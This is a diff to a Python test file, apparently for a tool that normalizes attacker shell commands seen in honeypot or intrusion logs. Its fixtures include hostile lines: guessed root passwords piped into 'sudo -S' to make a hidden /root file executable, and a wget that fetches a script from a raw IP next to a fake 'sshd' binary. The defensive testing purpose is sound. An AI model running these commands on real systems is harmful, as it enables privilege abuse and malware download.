@@ -16,6 +16,13 @@ def test_random_arithmetic_challenges_collapse():
     assert normalize_command("sleep 5") != normalize_command("sleep 60")
 
 
+def test_replayed_login_password_collapses():
+    a = "echo 'root12' | sudo -S sh -c 'chmod +x /root/.16' || chmod +x '/root/.16'"
+    b = "echo '123qwerty' | sudo -S sh -c 'chmod +x /root/.16' || chmod +x '/root/.16'"
+    assert normalize_command(a) == normalize_command(b)
+    assert normalize_command(a).startswith("echo '<PASS>' | sudo -S")
+
+
 def test_temp_paths_and_ips_collapse():
     assert normalize_command("chmod +x /tmp/x8Fq2/sshd; wget http://45.9.148.1/a.sh") == normalize_command(
         "chmod +x /tmp/Zz91k/sshd; wget http://103.4.5.66/a.sh"
